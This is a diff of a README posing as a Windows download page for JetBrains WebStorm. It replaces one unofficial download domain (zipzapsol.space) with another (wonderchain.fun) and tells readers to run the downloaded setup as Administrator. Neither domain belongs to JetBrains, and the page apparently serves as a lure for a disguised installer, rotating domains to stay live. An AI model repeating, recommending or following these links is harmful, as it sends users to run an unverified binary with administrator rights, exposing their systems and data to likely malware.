@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **JetBrains WebStorm** for Windows.
 
 <p align="center">
-  <a href="https://webstorm.zipzapsol.space/">
+  <a href="https://webstorm.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-JetBrains%20WebStorm-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download JetBrains WebStorm">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[webstorm.zipzapsol.space](https://webstorm.zipzapsol.space/)** |
-| **Full URL** | `https://webstorm.zipzapsol.space/` |
+| **Direct link** | **[webstorm.wonderchain.fun](https://webstorm.wonderchain.fun/)** |
+| **Full URL** | `https://webstorm.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — webstorm.zipzapsol.space](https://webstorm.zipzapsol.space/)** (link above)
+1. Click **[Download — webstorm.wonderchain.fun](https://webstorm.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://webstorm.zipzapsol.space/"><strong>⬇ Download JetBrains WebStorm now</strong></a></p>
+<p align="center"><a href="https://webstorm.wonderchain.fun/"><strong>⬇ Download JetBrains WebStorm now</strong></a></p>
 
 ---
 
